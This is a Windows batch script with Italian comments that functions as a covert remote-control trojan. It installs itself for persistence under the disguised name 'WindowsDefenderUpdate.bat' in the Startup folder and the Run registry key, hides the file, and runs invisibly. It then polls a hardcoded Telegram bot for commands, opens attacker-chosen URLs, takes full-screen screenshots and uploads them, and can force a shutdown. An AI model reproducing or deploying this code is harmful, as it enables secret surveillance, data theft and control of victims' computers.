@echo off
:: Script Batch Silenzioso con Screenshot Automatico dopo apertura sito
:: Modalità completamente invisibile all'utente

:: Configurazione iniziale
setlocal enabledelayedexpansion

:: Offuscamento dati Telegram
set "b=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "c=5709299213"
set "API=https://api.telegram.org/bot%b%"

:: Fase 1 - Auto-installazione stealth
if not "%1"=="--hidden" (
    :: Copia in startup con nome legittimo
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderUpdate.bat" >nul 2>&1
    attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderUpdate.bat" >nul 2>&1
    
    :: Aggiungi al registro
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderUpdater" /t REG_SZ /d "\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefenderUpdate.bat\" --hidden" /f >nul 2>&1
    
    :: Riavvio in modalità nascosta
    start /B /MIN "" "%~f0" --hidden
    exit
)

:: Fase 2 - Modalità operativa invisibile
:main
setlocal enabledelayedexpansion

:: Notifica connessione iniziale
powershell -command "$null=Invoke-WebRequest -Uri '!API!/sendMessage?chat_id=%c%&text=🖥️ [%COMPUTERNAME%] - Ready for commands' -UseBasicParsing" 2>nul

:: Loop principale per i comandi
:command_loop
for /f "delims=" %%A in ('powershell -command "$resp=try{Invoke-WebRequest -Uri '!API!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{}; $resp.result[-1].message.text" 2^>nul') do (
    set "COMMAND=%%A"
)

:: Gestione comandi
if not "!COMMAND!"=="" (
    if "!COMMAND:~0,5!"=="open:" (
        set "URL=!COMMAND:~5!"
        powershell -command "$null=Invoke-WebRequest -Uri '!API!/sendMessage?chat_id=%c%&text=🌐 Opening URL on %COMPUTERNAME%: !URL!' -UseBasicParsing" 2>nul
        
        :: Apri l'URL e attendi 5 secondi
        start "" "!URL!"
        timeout /t 5 /nobreak >nul
        
        :: Cattura screenshot automatico
        set "SCREENSHOT_FILE=%TEMP%\ss_%RANDOM%.jpg"
        powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); $bitmap.Save('!SCREENSHOT_FILE!', [System.Drawing.Imaging.ImageFormat]::Jpeg); $bitmap.Dispose(); $graphics.Dispose(); $null=Invoke-WebRequest -Uri '!API!/sendPhoto' -Method Post -ContentType 'multipart/form-data' -Form @{chat_id='%c%'; photo=Get-Item '!SCREENSHOT_FILE!'}; Remove-Item '!SCREENSHOT_FILE!'" 2>nul
        
        :: Notifica completamento
        powershell -command "$null=Invoke-WebRequest -Uri '!API!/sendMessage?chat_id=%c%&text=📸 Screenshot captured after opening !URL!' -UseBasicParsing" 2>nul
    )
    
    if "!COMMAND!"=="off" (
        powershell -command "$null=Invoke-WebRequest -Uri '!API!/sendMessage?chat_id=%c%&text=🔌 Shutting down %COMPUTERNAME%...' -UseBasicParsing" 2>nul
        shutdown /s /f /t 0
        exit
    )
)

:: Attesa randomica tra 10-30 secondi
powershell -command "Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)"
goto command_loop
